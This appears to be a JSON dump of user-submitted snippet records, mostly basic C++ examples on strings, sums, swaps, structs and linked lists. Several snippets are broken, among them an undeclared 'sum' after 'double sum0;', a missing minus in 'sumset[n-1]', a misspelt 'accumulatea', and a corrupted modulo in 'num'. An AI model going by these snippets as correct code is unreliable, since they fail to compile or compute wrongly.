    "description": "// stringstream::str #include <string>       // std::string #include <iostream>     // std::cout #include <sstream>      // std::stringstream, std::stringbuf  int main () {   std::stringstream ss;   ss.str (\"Example string\");   std::string s = ss.str();   std::cout << s << '\\n';   return 0; }\n#include <iostream> #include <sstream>  std::string input = \"abc,def,ghi\"; std::istringstream ss(input); std::string token;  while(std::getline(ss, token, ',')) {     std::cout << token << '\\n'; }\n- A stringstream associates a string object with a stream allowing  you to read from the string as if it were a stream (like cin). - Method:  clear() &mdash; to clear the stream  str() &mdash; to get and set string object whose content is present in stream.  operator << &mdash; add a string to the stringstream object.  operator >> &mdash; read something from the stringstream object, \nstd::stringstream os; os << \"12345 67.89\"; // insert a string of numbers into the stream  std::string strValue; os >> strValue;  std::string strValue2; os >> strValue2;  // print the numbers separated by a dash std::cout << strValue << \" - \" << strValue2 << std::endl; \n// EXAMPLE ostringstream ssTextAsStream(\"This is part of the stream.\"); // declare ostringstream string sTextAsString = ssTextAsStream.str(); // converted to string cout << sTextAsString << \"\\n\"; // printed out  /* SYNTAX <YourStringStream>.str() */  /* HEADERS #include <iostream> #include <sstream> using namespace std; */\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3891,
    "keyword": null,
    "link": null,
    "title": " stringstream stream number to string",
    "description": "#include <sstream>  std::string number_to_string(int num) {     std::stringstream stream;      stream << num;     return stream.str(); }\n",
    "reg_date": "2021-10-12T11:43:42.000Z"
  },
  {
    "id": 3892,
    "keyword": null,
    "link": null,
    "title": " stringstream tutorial",
    "description": "#include <iostream> #include <vector> #include <string> #include <sstream> using namespace std; int main() {    string str(\"Hello from the dark side\");    string tmp; // A string to store the word on each iteration.    stringstream str_strm(str);    vector<string> words; // Create vector to hold our words    while (str_strm >> tmp) {       // Provide proper checks here for tmp like if empty       // Also strip down symbols like !, ., ?, etc.       // Finally push it.       words.push_back(tmp);    }    for(int i = 0; i<words.size(); i++)       cout << words[i] << endl; }\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3893,
    "keyword": null,
    "link": null,
    "title": " strip whitespace c++",
    "description": "#include <algorithm>  #include <cctype> #include <locale>  // trim from start (in place) static inline void ltrim(std::string &s) {     s.erase(s.begin(), std::find_if(s.begin(), s.end(), [](unsigned char ch) {         return !std::isspace(ch);     })); }  // trim from end (in place) static inline void rtrim(std::string &s) {     s.erase(std::find_if(s.rbegin(), s.rend(), [](unsigned char ch) {         return !std::isspace(ch);     }).base(), s.end()); }  // trim from both ends (in place) static inline void trim(std::string &s) {     ltrim(s);     rtrim(s); }  // trim from start (copying) static inline std::string ltrim_copy(std::string s) {     ltrim(s);     return s; }  // trim from end (copying) static inline std::string rtrim_copy(std::string s) {     rtrim(s);     return s; }  // trim from both ends (copying) static inline std::string trim_copy(std::string s) {     trim(s);     return s; } \n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3894,
    "keyword": null,
    "link": null,
    "title": " strlen  in C++",
    "description": "#include <cstring> #include <iostream> using namespace std;  int main() {   char str1[] = \"This a string\";   char str2[] = \"This is another string\";    // find lengths of str1 and str2   // size_t return value converted to int       int len1 = strlen(str1);   int len2 = strlen(str2);    cout << \"Length of str1 = \" << len1 << endl;   cout << \"Length of str2 = \" << len2 << endl;    if (len1 > len2)     cout << \"str1 is longer than str2\";   else if (len1 < len2)     cout << \"str2 is longer than str1\";   else     cout << \"str1 and str2 are of equal length\";    return 0; }\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3895,
    "keyword": null,
    "link": null,
    "title": " strlen in c++",
    "description": "#include <cstring> #include <cstring>  using namespace std;  int main(void) {   char stringName[] = \"This contains the content of your string\";   int stringLength = strlen(stringName);   cout << \"String: \" << stringName << endl << \"Length of String: \" << stringLength << endl;      return 0; }\n#include <iostream> #include <string.h>  using namespace std;  int main() {     char *str = \"ABC\";     cout << strlen(str) << endl;     return 0; }\n#include <cstring> #include <iostream>  using namespace std;  int main() {     char str1[] = \"This a string\";          int len1 = strlen(str1);      cout << \"Length of str1 = \" << len1 << endl;      return 0; }\n#include <cstring> strlen(str); \n#include <cstring> #include <iostream> using namespace std;  int main() {   char str1[] = \"This a string\";   char str2[] = \"This is another string\";    // find lengths of str1 and str2   // size_t return value converted to int       int len1 = strlen(str1);   int len2 = strlen(str2);    cout << \"Length of str1 = \" << len1 << endl;   cout << \"Length of str2 = \" << len2 << endl;    if (len1 > len2)     cout << \"str1 is longer than str2\";   else if (len1 < len2)     cout << \"str2 is longer than str1\";   else     cout << \"str1 and str2 are of equal length\";    return 0; }\n#include <iostream> #include <cstring> using namespace std;  int main() {    // initialize C-string   char song[] = \"We Will Rock You!\";    // print the length of the song string   cout << strlen(song);    return 0; }  // Output: 17\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3896,
    "keyword": null,
    "link": null,
    "title": " strlen in cpp",
    "description": "#include <cstring> #include <cstring>  using namespace std;  int main(void) {   char stringName[] = \"This contains the content of your string\";   int stringLength = strlen(stringName);   cout << \"String: \" << stringName << endl << \"Length of String: \" << stringLength << endl;      return 0; }\n#include <cstring> #include <iostream>  using namespace std;  int main() {     char str1[] = \"This a string\";          int len1 = strlen(str1);      cout << \"Length of str1 = \" << len1 << endl;      return 0; }\n#include <cstring> strlen(str); \n#include <iostream> #include <cstring> using namespace std;  int main() {    // initialize C-string   char song[] = \"We Will Rock You!\";    // print the length of the song string   cout << strlen(song);    return 0; }  // Output: 17\n#include <cstring> #include <iostream> using namespace std;  int main() {   char str1[] = \"This a string\";   char str2[] = \"This is another string\";    // find lengths of str1 and str2   // size_t return value converted to int       int len1 = strlen(str1);   int len2 = strlen(str2);    cout << \"Length of str1 = \" << len1 << endl;   cout << \"Length of str2 = \" << len2 << endl;    if (len1 > len2)     cout << \"str1 is longer than str2\";   else if (len1 < len2)     cout << \"str2 is longer than str1\";   else     cout << \"str1 and str2 are of equal length\";    return 0; }\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3897,
    "keyword": null,
    "link": null,
    "title": " strring length in c++",
    "description": "#include<string.h> string s; cin>>s; int len; len=s.length();\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3898,
    "keyword": null,
    "link": null,
    "title": " strtok in c++",
    "description": "#include <string.h> #include <stdio.h>  int main () {    char str[80] = \"This is - www.tutorialspoint.com - website\";    const char s[2] = \"-\";    char *token;        /* get the first token */    token = strtok(str, s);        /* walk through other tokens */    while( token != NULL ) {       printf( \" %s\\n\", token );            token = strtok(NULL, s);    }        return(0); }\n//The strtok() function in C++ returns the next token in a null terminated byte string. #include <cstring> #include <iostream> using namespace std; int main() {     char str[] = \"parrot,owl,sparrow,pigeon,crow\";     char delim[] = \",\";     cout << \"The tokens are:\" << endl;     char *token = strtok(str,delim);     while (token)     {         cout << token << endl;         token = strtok(NULL,delim);     }     return 0; }\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3899,
    "keyword": null,
    "link": null,
    "title": " strtol",
    "description": "// definition: long int strtol (const char* str, char** endptr, int base);  /* strtol example */ #include <stdio.h>      /* printf */ #include <stdlib.h>     /* strtol */  int main () {   char szNumbers[] = \"2001 60c0c0 -1101110100110100100000 0x6fffff\";   char * pEnd;   long int li1, li2, li3, li4;   li1 = strtol (szNumbers,&pEnd,10);   li2 = strtol (pEnd,&pEnd,16);   li3 = strtol (pEnd,&pEnd,2);   li4 = strtol (pEnd,NULL,0);   printf (\"The decimal equivalents are: %ld, %ld, %ld and %ld.\\n\", li1, li2, li3, li4);   return 0; }\nconst char * strstr( const char * fullString, const char * substring );    // C++ (<cstring>)       char * strstr(       char * fullString,       char * substring );    // C (<string.h>)\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3900,
    "keyword": null,
    "link": null,
    "title": " struct c++",
    "description": "struct Student {     string Nom;     int Surn;     int Age; };\n//Struct is a compound data type that contains different variables of different types. struct Student {     char stuName[30];     int stuRollNo;     int stuAge; }; \nstruct product {   int weight;   double price; } ;  product apple; product banana, melon;\n #include <bits/stdc++.h> #include <iostream>  #define ll long long  using namespace std;  struct student{ \tint roll; \tstring name; \tint age; \t \tvoid studentDetails(){ \t\tcout<<\"Name is \"<<name<<\" Age is \"<<age<<\" roll no is \"<<roll<<endl; \t} };   int main(){ \t \tstudent sumant; \tsumant.roll = 30; \tsumant.name = \"Sumant Tirkey\"; \tsumant.age = 18; \t \tsumant.studentDetails(); \tcout<<endl;      return 0; }\nstruct Person {     char name[50];     int age;     float salary; };\nstruct product {   int weight;   double price; } apple, banana, melon;\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3901,
    "keyword": null,
    "link": null,
    "title": " structure in c++ all in one",
    "description": "#include <iostream> using namespace std;  struct Person {     char name[50];     int age;     float salary; };  struct Person p;  Person getData(); void displayData();  int main() {     struct Person p;        p = getData();     displayData();        return 0; }  Person getData() {      cout << \"Enter Full name: \";     cin.get(p.name, 50);      cout << \"Enter age: \";     cin >> p.age;      cout << \"Enter salary: \";     cin >> p.salary;      return p; }  void displayData() {     cout << \"\\nDisplaying Information.\" << endl;     cout << \"Name: \" << p.name << endl;     cout << \"Age: \" << p.age << endl;     cout << \"Salary: \" << p.salary; }\n",
    "reg_date": "2021-10-12T11:43:43.000Z"
  },
  {
    "id": 3902,
    "keyword": null,
    "link": null,
    "title": " student class in c++",
    "description": "class Date {        unsigned int day;        unsigned int month;        unsigned int year;        public:               Date(void)                                                          {                             cout << \"Default Date\" << endl;                   }                                      Date(int d, int m, int y)                   {                            if( d > 31 ){                                cout << \"invalid date\" << endl;                                getchar();                                exit(0);                            }                            day = d;                            month = m;                            year = y;                            cout << \"Constructor Date\" << endl;                   }                   ~Date()                   {                          cout << \"Destructor Date\" << endl;                   }               void print(void)               {                          cout << day << \"/\" << month << \"/\" << year << endl;               }                          };         class student{           char *name;           char *family;           char *stdNo;           unsigned int year;           Date birthday;                  public:              student(char n[]=\"\",char f[]=\"\",char no[]=\"0\",unsigned int y=1300,Date b=Date(1,1,1300))              {                     name = new char[strlen(n)+1];                           strcpy(name,n);                     family = new char [strlen(f)+1];                     strcpy(family,f);                     stdNo = new char [strlen(no)+1];                     strcpy(stdNo,no);                     year = y;                     birthday = b;                     cout << \"Constructor student\" << endl;              }              ~student(void)              {                        delete [] name;                        delete [] family;                        delete [] stdNo;                        cout << \"destructor student\" << endl;              }                  Date get_date(void)              {                     return birthday;              }                      void show()              {                   cout << name << \" \" << family << endl;                   cout << \"Student Number: \" << stdNo << endl;                   cout << \"Entrance year: \" << year << endl;                   cout << \"Birthday: \" ;                   birthday.print();              }       };\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3903,
    "keyword": null,
    "link": null,
    "title": " subset sum problem using backtracking in c++",
    "description": "    /* Part of Cosmos by OpenGenus Foundation */     #include<iostream>     using namespace std;     /*     *Find whether or not there exists any subset      *  of array  that sum up to targetSum     */     class Subset_Sum     {         public:         // BACKTRACKING ALGORITHM         void subsetsum_Backtracking(int Set[] , int pos, int sum, int tmpsum, int size, bool & found)         {             if (sum == tmpsum)                 found = true;                 // generate nodes along the breadth             for (int i = pos; i < size; i++)             {              if (tmpsum + Set[i] <= sum)                {                   tmpsum += Set[i];                      // consider next level node (along depth)                   subsetsum_Backtracking(Set, i + 1, sum, tmpsum, size, found);                   tmpsum -= Set[i];                 }             }         }     };          int main()     {         int i, n, sum;         Subset_Sum S;         cout << \"Enter the number of elements in the set\" << endl;         cin >> n;         int a[n];         cout << \"Enter the values\" << endl;         for(i=0;i<n;i++)           cin>>a[i];         cout << \"Enter the value of sum\" << endl;         cin >> sum;         bool f = false;         S.subsetsum_Backtracking(a, 0, sum, 0, n, f);         if (f)            cout << \"subset with the given sum found\" << endl;         else            cout << \"no required subset found\" << endl;            return 0;     } \ndef SubsetSum(set, n, sum) :    # Base Cases    if (sum == 0) :       return True    if (n == 0 and sum != 0) :       return False    # ignore if last element is > sum    if (set[n - 1] > sum) :       return SubsetSum(set, n - 1, sum);    # else,we check the sum    # (1) including the last element    # (2) excluding the last element    return SubsetSum(set, n-1, sum) or SubsetSum(set, n-1, sumset[n-1]) # main set = [2, 14, 6, 22, 4, 8] sum = 10 n = len(set) if (SubsetSum(set, n, sum) == True) :    print(\"Found a subset with given sum\") else :    print(\"No subset with given sum\")\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3904,
    "keyword": null,
    "link": null,
    "title": " substitution failure is not an error",
    "description": "/* \"Substitution Failure Is Not An Error\"  This rule applies during overload resolution of function templates: When substituting the explicitly specified or deduced type for the template parameter fails, the specialization is discarded from the overload set instead of causing a compile error.  This feature is used in template metaprogramming. STL features like std::enable_if use SFINAE */\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3905,
    "keyword": null,
    "link": null,
    "title": " substr (pos,length)",
    "description": "#include <string.h> #include <iostream> using namespace std; int main(){     // Take any string     string s1 = \"Geeks\";     // Copy three characters of s1 (starting      // from position 1)     string r = s1.substr(1, 3);     // prints the result     cout << \"String is: \" << r; //String is: eek     return 0; }\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3906,
    "keyword": null,
    "link": null,
    "title": " substr c++",
    "description": "s.substr(pos,len);\n// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\nstring sub_string=main_string.substr(first_pos_of_the_substring_from_main_string,length_of_the_substring_from_main_string_starting_from_the_first_position\nstr.substr(start[, length])\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3907,
    "keyword": null,
    "link": null,
    "title": " substring function in c++",
    "description": "s.substr(pos,len);\n// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\nstring sub_string=main_string.substr(first_pos_of_the_substring_from_main_string,length_of_the_substring_from_main_string_starting_from_the_first_position\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3908,
    "keyword": null,
    "link": null,
    "title": " subtract from array using pointers c++",
    "description": "#include<iostream>  int main() {\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t    // [0], [1], [2], [3], [4]   char array_my_name [] {\"amir\"};  //   a,   m    i     r   null      char *char_ptr1{nullptr};   char *char_ptr2{nullptr};      char_ptr1 = &array_my_name[1];   char_ptr2 = &array_my_name[3];   \t\t\t\t\t\t\t\t\t//amir   std::cout<<\"in the string, \"<< array_my_name      \t\t\t\t\t //r \t\t\t\t\t\t2   <<\"the charachter \"<<*char_ptr2<<\" is \"<<(char_ptr2-char_ptr1)     \t\t\t\t\t\t\t//m   <<\"charchters away from \"<<*char_ptr1<<std::endl;      return 0; }    \n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3909,
    "keyword": null,
    "link": null,
    "title": " sum array c++",
    "description": "//Syntax accumulate(first, last, sum); accumulate(first, last, sum, myfun);   first, last : first and last elements of range                whose elements are to be added sum :  initial value of the sum myfun : a function for performing any          specific task. For example, we can         find product of elements between         first and last. //Example   int a[] = {5 , 10 , 15} ;   int res = accumulate(a,a+3,0); // 30\n array<int,10> a{1,2,3,4,5,6,7,8,9};   int sum = 0; //Method 1:   sum = accumulatea(a.begin(), a.end(), 0); //Method 2:    for(auto& i : a) sum+=i;\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3910,
    "keyword": null,
    "link": null,
    "title": " sum elements in vector c++",
    "description": "accumulate(a.begin(), a.end(), 0);\naccumulate(a.begin(), a.end(), 0)\nfor (auto& n : vector)     sum_of_elems += n;\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3911,
    "keyword": null,
    "link": null,
    "title": " sum of 2 numbers in cpp",
    "description": "#include<iostream> int add(int,int); int main() { \tusing namespace std; \tint a,b; \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \tcout<<\"Sum = \"<<add(a,b); } int add(int x,int y) { \treturn(x+y); }\n#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:43:44.000Z"
  },
  {
    "id": 3912,
    "keyword": null,
    "link": null,
    "title": " sum of 2 numbers in cpp function",
    "description": "#include<iostream> int add(int,int); int main() { \tusing namespace std; \tint a,b; \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \tcout<<\"Sum = \"<<add(a,b); } int add(int x,int y) { \treturn(x+y); }\n#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3913,
    "keyword": null,
    "link": null,
    "title": " sum of all leaf nodes of binary tree",
    "description": "#include<iostream> using namespace std; struct node {   int data;   node* left;   node* right; }; node* getnode(int value) {   node *temp=new node;   temp->data=value;   temp->left=NULL;   temp->right=NULL;   return temp; } node* insert_bst(node *roots,int value) {   if(roots==NULL)   {     return getnode(value);   }   if(roots->data>value)   {     roots->left=insert_bst(roots->left,value);   }   else if(roots->data<value)   {    roots->right=insert_bst(roots->right,value);   }   return roots; } int leaf_sum(node *roots) {   if(roots==NULL)   {     return 0;   }   if(roots->left==NULL&&roots->right==NULL)   {     return roots->data;   }   return (leaf_sum(roots->left)+leaf_sum(roots->right)); } int main() {     node * root=new node;     root=NULL;   int value;   do   {     cin>>value;     if(value>0)     {       root=insert_bst(root,value);     }     }while(value>0);     //Inorder(root);    cout<<\"Sum of all leaf nodes are \"<<leaf_sum(root);   return 0; } \n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3914,
    "keyword": null,
    "link": null,
    "title": " sum of n natural no using for loop in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tint sum=0; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tsum+=i; \t \t} \t\tcout<<sum<<\" \"; \tcout<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3915,
    "keyword": null,
    "link": null,
    "title": " sum of n natural numbers",
    "description": "# Sum of natural numbers up to num  num = 16  if num < 0:    print(\"Enter a positive number\") else:    sum = 0    # use while loop to iterate until zero    while(num > 0):        sum += num        num -= 1    print(\"The sum is\", sum) \nSum of n integers 1 + 2 + 3 + ... + n = n * (n + 1) / 2\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tint sum=0; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tsum+=i; \t} \t\tcout<<sum<<\" \"; \tcout<<endl; \treturn 0; }\nSum of the First n Natural Numbers. We prove the formula 1+ 2+ ... + n = n(n+1) / 2, for n a natural number\nint addNumbers(int n) {     int count, sum = 0;      for(count=1; count <= n; count++)     {         sum = sum + count;     }        return sum; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3916,
    "keyword": null,
    "link": null,
    "title": " sum of n natural numbers in c",
    "description": "int addNumbers(int n) {     int count, sum = 0;      for(count=1; count <= n; count++)     {         sum = sum + count;     }        return sum; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3917,
    "keyword": null,
    "link": null,
    "title": " sum of number",
    "description": "// Find Sum of Digits of a Number using for Loop // ----codescracker.com----  #include<iostream> using namespace std; int main() {     int num, rem, sum;     cout<<\"Enter the Number: \";     cin>>num;     for(sum=0; num>0; num=num/10)     {         rem = num\u0010;         sum = sum+rem;     }     cout<<\"\\nSum of Digits = \"<<sum;     cout<<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3918,
    "keyword": null,
    "link": null,
    "title": " sum of stack c++",
    "description": " stack<int> si;     int sum = 0;     stack<int> tsi(si);     while (!tsi.empty()) {         sum += tsi.top();         tsi.pop();     }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3919,
    "keyword": null,
    "link": null,
    "title": " sum of two numbers c++",
    "description": "#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3920,
    "keyword": null,
    "link": null,
    "title": " sum of vector c++",
    "description": "accumulate(a.begin(), a.end(), 0);\naccumulate(a.begin(), a.end(), 0)\n  vector<int> v{1,2,3,4,5,6,7,8,9};   int sum = 0; //Method 1:   sum = accumulate(v.begin(), v.end(), 0); //Method 2:    for(auto& i : v) sum+=i;\n//Syntax accumulate(first, last, sum); accumulate(first, last, sum, myfun);   first, last : first and last elements of range                whose elements are to be added sum :  initial value of the sum myfun : a function for performing any          specific task. For example, we can         find product of elements between         first and last. //Example   int a[] = {5 , 10 , 15} ;   int res = accumulate(a,a+3,0); // 30\nfor (auto& n : vector)     sum_of_elems += n;\n#include <numeric>  sum_of_elems = std::accumulate(vector.begin(), vector.end(), 0); \n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3921,
    "keyword": null,
    "link": null,
    "title": " sum vector c++",
    "description": "accumulate(a.begin(), a.end(), 0);\n  vector<int> v{1,2,3,4,5,6,7,8,9};   int sum = 0; //Method 1:   sum = accumulate(v.begin(), v.end(), 0); //Method 2:    for(auto& i : v) sum+=i;\nfor (auto& n : vector)     sum_of_elems += n;\n // Sum digits in vector int digit_sum(vector<int> num) {     int sum = 0;     for (auto x : num) sum += x;     return sum; }\n",
    "reg_date": "2021-10-12T11:43:45.000Z"
  },
  {
    "id": 3922,
    "keyword": null,
    "link": null,
    "title": " summary a long walk to water",
    "description": "//bruh y u ask grepper??\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3923,
    "keyword": null,
    "link": null,
    "title": " surf interpolation matlab",
    "description": " shading interp\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3924,
    "keyword": null,
    "link": null,
    "title": " swap first and last character of string in c++",
    "description": "std::swap(str.front(), str.back());\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3925,
    "keyword": null,
    "link": null,
    "title": " swap function c++ using pointer",
    "description": "#include <stdio.h> void SwapValue(int &a, int &b) {    int t = a;    a = b;    b = t; } int main() {    int a, b;    printf(\"Enter value of a : \");    scanf(\"%d\", &a);    printf(\"\\nEnter value of b : \");    scanf(\"%d\", &b);    SwapValue(a, b);    printf(\"\\nAfter swapping, the values are: a = %d, b = %d\", a, b);    return 0; }\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3926,
    "keyword": null,
    "link": null,
    "title": " swap in cpp",
    "description": "int a{}, b{}, temp{}; cin >> a >> b;    //===================== METHOD-1    temp = a;    a = b;    b = temp;    //===================== METHOD-2 ( XOR ^ )   // example: a^b =  5^7    a = a ^ b;   // 5^7    b = a ^ b;   // 5 ^ 7 ^ 7  //5 ( 7 & 7 dismissed)    a = a ^ b;   // 5 ^ 7 ^ 5  //7 ( 5 & 5 dismissed)    //===================== METHOD-3  ( swap() )   swap(a, b);    cout << \"a \" << a << endl;   cout << \"b \" << b << endl; \nReturn Value: The function does not return anything, it swaps the values of the two variables\nint main() { \tint a = 5; \tint b = 10;    \tswap(a, b);    \tcout << \"a = \" << a << endl; \tcout << \"b = \" << b << endl; }\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3927,
    "keyword": null,
    "link": null,
    "title": " swap string c++",
    "description": "public static void swap(int x, int y, int[] arr) {   \tint temp = arr[x];   \tarr[x] = arr[y];   \tarr[y] = temp; }\nstd::ostringstream strs; strs << dbl; std::string str = strs.str();\n// swap strings #include <iostream> #include <string>  main () {   std::string buyer (\"money\");   std::string seller (\"goods\");    std::cout << \"Before the swap, buyer has \" << buyer;   std::cout << \" and seller has \" << seller << '\\n';    seller.swap (buyer);    std::cout << \" After the swap, buyer has \" << buyer;   std::cout << \" and seller has \" << seller << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3928,
    "keyword": null,
    "link": null,
    "title": " swap two nodes in linked list",
    "description": "//not changing the data inside //Try on your own first #include<iostream> using namespace std; struct node {   int data;   node* next; }; node * head=NULL; void insertion(int key) {   node *temp=new node;   temp->data=key;   temp->next=NULL;   if(head==NULL)   {     head=temp;   }   else   {     node* ptr=head;     while(ptr->next!=NULL)     {       ptr=ptr->next;     }     ptr->next=temp;   } } void swapnode(int x,int y) {   if(x==y)   {     return;   }   node *x_prev=NULL;   node* x_curr=head;   node* y_prev=NULL;   node* y_curr=head;   while(x_curr!=NULL&&x_curr->data!=x)   {     x_prev=x_curr;     x_curr=x_curr->next;   }   while(y_curr!=NULL&&y_curr->data!=y)   {     y_prev=y_curr;     y_curr=y_curr->next;   }   if(x_curr==NULL||y_curr==NULL)   {     return;   }   if(x_prev!=NULL)   {     x_prev->next=y_curr;   }   else   {     head=y_curr;   }   if(y_prev!=NULL)   {     y_prev->next=x_curr;   }   else   {     head=x_curr;   }   node *temp=y_curr->next;   y_curr->next=x_curr->next;   x_curr->next=temp; } void print() {   node* temp=head;   while(temp!=NULL)   {     cout<<temp->data<<\" \";     temp=temp->next;   } } int main() {   int n;   cin>>n;   int value;   for(int i=0;i<n;i++)   {     cin>>value;     insertion(value);   }   int p,q;   cin>>p>>q;   swapnode(p,q);   print();   return 0; } \n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3929,
    "keyword": null,
    "link": null,
    "title": " swap using Function template in  c++",
    "description": "#include <bits/stdc++.h> using namespace std; template<class T , class T1> void excha(T &a , T1 &b){     T temp = a;     a = b;     b = temp;      } int main(){     // int a , b;     // cout<<\"Enter the value of a and B \"<<endl;     // cin>>a>>b;     // excha(a,b);     // cout<<a<<\" \"<<b<<endl;      // cout<<endl;      // float a , b;     // cout<<\"Enter the value of a and B \"<<endl;     // cin>>a>>b;     // excha(a,b);     // cout<<a<<\" \"<<b<<endl;      cout<<endl;      float a ;int b;     cout<<\"Enter the value of a and B \"<<endl;     cin>>a;     cin>>b;     excha(a,b);     cout<<a<<\" \"<<b<<endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3930,
    "keyword": null,
    "link": null,
    "title": " swap values in array c++",
    "description": "#include <algorithm> #include <iostream>  using namespace std;  int main() {      int array[]={1, 2};      cout<<array[0]<<\" \"<<array[1]<<endl;      swap(array[0], array[1]);      cout<<array[0]<<\" \"<<array[1];      return 0; }\n",
    "reg_date": "2021-10-12T11:43:46.000Z"
  },
  {
    "id": 3931,
    "keyword": null,
    "link": null,
    "title": " swap vector c++",
